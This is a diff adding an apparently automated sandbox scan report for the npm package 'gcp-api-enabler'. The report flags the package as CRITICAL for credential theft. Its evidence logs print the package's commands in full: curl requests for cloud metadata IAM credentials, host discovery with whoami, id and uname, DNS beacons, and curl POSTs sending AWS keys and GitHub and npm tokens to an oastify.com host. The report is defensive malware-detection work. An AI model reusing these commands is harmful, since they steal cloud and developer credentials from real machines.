@@ -1,0 +1,334 @@
+{
+ "scan_id": "rh-20261106-092034-91251d",
+ "package": "gcp-api-enabler",
+ "version": "99.8.1",
+ "integrity": "sha512-G+RY1MxMYy2gV7K58PRm9z8hyhJ40uEzPoHf9CWkXtCB21mM4RXVI3vny1R5D7ioGNYdOwpryNxejMhxpk2tOg==",
+ "verdict": "CRITICAL",
+ "reasons": [
+  "CRITICAL: honeytoken aws_access_key_id left the sandbox",
+  "CRITICAL: honeytoken aws_secret_access_key left the sandbox",
+  "CRITICAL: honeytoken github_token left the sandbox",
+  "CRITICAL: honeytoken metadata_access_key_id left the sandbox",
+  "CRITICAL: honeytoken metadata_secret left the sandbox",
+  "CRITICAL: honeytoken npm_token left the sandbox",
+  "HIGH: sent this machine's name to an outside host",
+  "HIGH: contacted a data-collection service (oastify.com)",
+  "HIGH: spawned curl",
+  "HIGH: spawned curl",
+  "HIGH: spawned curl",
+  "HIGH: spawned curl",
+  "HIGH: spawned curl",
+  "HIGH: spawned curl",
+  "HIGH: spawned curl",
+  "REVIEW: network attempts to 169.254.169.254, eyj0aw1lc3rhbxaioiiymdi2ltexlta2vda5ojiwojm4ljawov.m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com, eyj0aw1lc3rhbxaioiiymdi2ltexlta2vda5ojiwojqwljcwnl.m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com, m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com"
+ ],
+ "container_aware": false,
+ "seconds": 6.98,
+ "evidence": {
+  "exfil_matches": [
+   "aws_access_key_id",
+   "aws_secret_access_key",
+   "github_token",
+   "metadata_access_key_id",
+   "metadata_secret",
+   "npm_token"
+  ],
+  "machine_leaks": [
+   "m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com"
+  ],
+  "token_uses": [],
+  "bait_reads": [],
+  "connects": [
+   "169.254.169.254",
+   "eyj0aw1lc3rhbxaioiiymdi2ltexlta2vda5ojiwojm4ljawov.m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com",
+   "eyj0aw1lc3rhbxaioiiymdi2ltexlta2vda5ojiwojqwljcwnl.m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com",
+   "m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com"
+  ],
+  "execs": [
+   [
+    [
+     "npm",
+     "rebuild",
+     "--foreground-scripts",
+     "--ignore-scripts=false"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "rebuild",
+     "--foreground-scripts",
+     "--ignore-scripts=false"
+    ],
+    false
+   ],
+   [
+    [
+     "sh",
+     "-c",
+     "node index.js"
+    ],
+    true
+   ],
+   [
+    [
+     "node",
+     "index.js"
+    ],
+    true
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "curl -s --connect-timeout 3 \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\""
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-s",
+     "--connect-timeout",
+     "3",
+     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "curl -s --connect-timeout 3 \"http://169.254.169.254/latest/meta-data/iam/security-credentials/redhanded-scan-role\""
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-s",
+     "--connect-timeout",
+     "3",
+     "http://169.254.169.254/latest/meta-data/iam/security-credentials/redhanded-scan-role"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "curl -s --connect-timeout 3 \"http://169.254.169.254/latest/meta-data/instance-id\""
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-s",
+     "--connect-timeout",
+     "3",
+     "http://169.254.169.254/latest/meta-data/instance-id"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "curl -s --connect-timeout 3 \"http://169.254.169.254/latest/meta-data/placement/region\""
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-s",
+     "--connect-timeout",
+     "3",
+     "http://169.254.169.254/latest/meta-data/placement/region"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "curl -s --connect-timeout 3 \"http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info\""
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-s",
+     "--connect-timeout",
+     "3",
+     "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "whoami"
+    ],
+    false
+   ],
+   [
+    [
+     "whoami"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "id"
+    ],
+    false
+   ],
+   [
+    [
+     "id"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "pwd"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "uname -a"
+    ],
+    false
+   ],
+   [
+    [
+     "uname",
+     "-a"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "nslookup eyJ0aW1lc3RhbXAiOiIyMDI2LTExLTA2VDA5OjIwOjM4LjAwOV.m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com"
+    ],
+    false
+   ],
+   [
+    [
+     "nslookup",
+     "eyJ0aW1lc3RhbXAiOiIyMDI2LTExLTA2VDA5OjIwOjM4LjAwOV.m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "curl -X POST https://m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com -H \"Content-Type: application/json\" -d '{\"timestamp\":\"2026-11-06T09:20:38.009Z\",\"hostname\":\"dev-laptop-1879d220\",\"platform\":\"linux\",\"user\":\"root\",\"awsData\":{\"metadata\":{\"credentials\":{\"Code\":\"Success\",\"Type\":\"AWS-HMAC\",\"AccessKeyId\":\"<honeytoken>\",\"SecretAccessKey\":\"gjdzWBF0s+aNlPOCzzqX9ItkjrznHbLWqi4vmjfr\",\"Token\":\"Z2pkeldCRjBzK2FObFBPQ3p6cVg5SXRranJ6bkhiTFdxaTR2bWpmcg==\",\"Expiration\":\"2099-01-01T00:00:00Z\"},\"instanceId\":\"{}\",\"region\":\"{}\",\"accountId\":\"{}\",\"roleName\":\"redhanded-scan-role\"},\"environment\":{\"GITHUB_TOKEN\":\"<honeytoken>\",\"NPM_TOKEN\":\"<honeytoken>\",\"AWS_ACCESS_KEY_ID\":\"<honeytoken>\",\"AWS_SECRET_ACCESS_KEY\":\"bIw0ET53bLjoJmCUrVuPZ5jKtxRW+8RZdWbUVtNS\"},\"files\":{},\"container\":{},\"systemInfo\":{\"hostname\":\"dev-laptop-1879d220\",\"user\":\"root\",\"id\":\"uid=0(root) gid=0(root) groups=0(root)\",\"pwd\":\"/work/node_modules/gcp-api-enabler\",\"uname\":\"Linux dev-laptop-1879d220 4.19.0-gvisor #1 SMP Sun Jan 10 15:06:54 PST 2016 x86_64 GNU/Linux\"}}}' --connect-timeout 5"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-X",
+     "POST",
+     "https://m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com",
+     "-H",
+     "Content-Type: application/json",
+     "-d",
+     "{\"timestamp\":\"2026-11-06T09:20:38.009Z\",\"hostname\":\"dev-laptop-1879d220\",\"platform\":\"linux\",\"user\":\"root\",\"awsData\":{\"metadata\":{\"credentials\":{\"Code\":\"Success\",\"Type\":\"AWS-HMAC\",\"AccessKeyId\":\"<honeytoken>\",\"SecretAccessKey\":\"gjdzWBF0s+aNlPOCzzqX9ItkjrznHbLWqi4vmjfr\",\"Token\":\"Z2pkeldCRjBzK2FObFBPQ3p6cVg5SXRranJ6bkhiTFdxaTR2bWpmcg==\",\"Expiration\":\"2099-01-01T00:00:00Z\"},\"instanceId\":\"{}\",\"region\":\"{}\",\"accountId\":\"{}\",\"roleName\":\"redhanded-scan-role\"},\"environment\":{\"GITHUB_TOKEN\":\"<honeytoken>\",\"NPM_TOKEN\":\"<honeytoken>\",\"AWS_ACCESS_KEY_ID\":\"<honeytoken>\",\"AWS_SECRET_ACCESS_KEY\":\"bIw0ET53bLjoJmCUrVuPZ5jKtxRW+8RZdWbUVtNS\"},\"files\":{},\"container\":{},\"systemInfo\":{\"hostname\":\"dev-laptop-1879d220\",\"user\":\"root\",\"id\":\"uid=0(root) gid=0(root) groups=0(root)\",\"pwd\":\"/work/node_modules/gcp-api-enabler\",\"uname\":\"Linux dev-laptop-1879d220 4.19.0-gvisor #1 SMP Sun Jan 10 15:06:54 PST 2016 x86_64 GNU/Linux\"}}}",
+     "--connect-timeout",
+     "5"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/work/.rh/load.js",
+     "gcp-api-enabler"
+    ],
+    false
+   ],
+   [
+    [
+     "/usr/local/bin/node",
+     "/work/.rh/exercise.js",
+     "gcp-api-enabler"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "nslookup eyJ0aW1lc3RhbXAiOiIyMDI2LTExLTA2VDA5OjIwOjQwLjcwNl.m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com"
+    ],
+    false
+   ],
+   [
+    [
+     "nslookup",
+     "eyJ0aW1lc3RhbXAiOiIyMDI2LTExLTA2VDA5OjIwOjQwLjcwNl.m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "curl -X POST https://m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com -H \"Content-Type: application/json\" -d '{\"timestamp\":\"2026-11-06T09:20:40.706Z\",\"hostname\":\"dev-laptop-1879d220\",\"platform\":\"linux\",\"user\":\"root\",\"awsData\":{\"metadata\":{\"credentials\":{\"Code\":\"Success\",\"Type\":\"AWS-HMAC\",\"AccessKeyId\":\"<honeytoken>\",\"SecretAccessKey\":\"gjdzWBF0s+aNlPOCzzqX9ItkjrznHbLWqi4vmjfr\",\"Token\":\"Z2pkeldCRjBzK2FObFBPQ3p6cVg5SXRranJ6bkhiTFdxaTR2bWpmcg==\",\"Expiration\":\"2099-01-01T00:00:00Z\"},\"instanceId\":\"{}\",\"region\":\"{}\",\"accountId\":\"{}\",\"roleName\":\"redhanded-scan-role\"},\"environment\":{\"GITHUB_TOKEN\":\"<honeytoken>\",\"NPM_TOKEN\":\"<honeytoken>\",\"AWS_ACCESS_KEY_ID\":\"<honeytoken>\",\"AWS_SECRET_ACCESS_KEY\":\"bIw0ET53bLjoJmCUrVuPZ5jKtxRW+8RZdWbUVtNS\"},\"files\":{},\"container\":{},\"systemInfo\":{\"hostname\":\"dev-laptop-1879d220\",\"user\":\"root\",\"id\":\"uid=0(root) gid=0(root) groups=0(root)\",\"pwd\":\"/work\",\"uname\":\"Linux dev-laptop-1879d220 4.19.0-gvisor #1 SMP Sun Jan 10 15:06:54 PST 2016 x86_64 GNU/Linux\"}}}' --connect-timeout 5"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-X",
+     "POST",
+     "https://m6trrzvv59p86mhnz1j5haqziqoic80x.oastify.com",
+     "-H",
+     "Content-Type: application/json",
+     "-d",
+     "{\"timestamp\":\"2026-11-06T09:20:40.706Z\",\"hostname\":\"dev-laptop-1879d220\",\"platform\":\"linux\",\"user\":\"root\",\"awsData\":{\"metadata\":{\"credentials\":{\"Code\":\"Success\",\"Type\":\"AWS-HMAC\",\"AccessKeyId\":\"<honeytoken>\",\"SecretAccessKey\":\"gjdzWBF0s+aNlPOCzzqX9ItkjrznHbLWqi4vmjfr\",\"Token\":\"Z2pkeldCRjBzK2FObFBPQ3p6cVg5SXRranJ6bkhiTFdxaTR2bWpmcg==\",\"Expiration\":\"2099-01-01T00:00:00Z\"},\"instanceId\":\"{}\",\"region\":\"{}\",\"accountId\":\"{}\",\"roleName\":\"redhanded-scan-role\"},\"environment\":{\"GITHUB_TOKEN\":\"<honeytoken>\",\"NPM_TOKEN\":\"<honeytoken>\",\"AWS_ACCESS_KEY_ID\":\"<honeytoken>\",\"AWS_SECRET_ACCESS_KEY\":\"bIw0ET53bLjoJmCUrVuPZ5jKtxRW+8RZdWbUVtNS\"},\"files\":{},\"container\":{},\"systemInfo\":{\"hostname\":\"dev-laptop-1879d220\",\"user\":\"root\",\"id\":\"uid=0(root) gid=0(root) groups=0(root)\",\"pwd\":\"/work\",\"uname\":\"Linux dev-laptop-1879d220 4.19.0-gvisor #1 SMP Sun Jan 10 15:06:54 PST 2016 x86_64 GNU/Linux\"}}}",
+     "--connect-timeout",
+     "5"
+    ],
+    false
+   ]
+  ],
+  "writes": [],
+  "incomplete": [],
+  "deadline_killed": false,
+  "load_hang": false,
+  "probe_flags": [],
+  "stats_count": 3016
+ },
+ "sandbox": {
+  "deadline_killed": false,
+  "exit_code": 0,
+  "errors": [],
+  "seconds": 6.72,
+  "syscall_lines": 31207,
+  "unparsed": 0,
+  "sinkhole_records": 22,
+  "dependencies": "no dependencies"
+ },
+ "microvm": null
+}
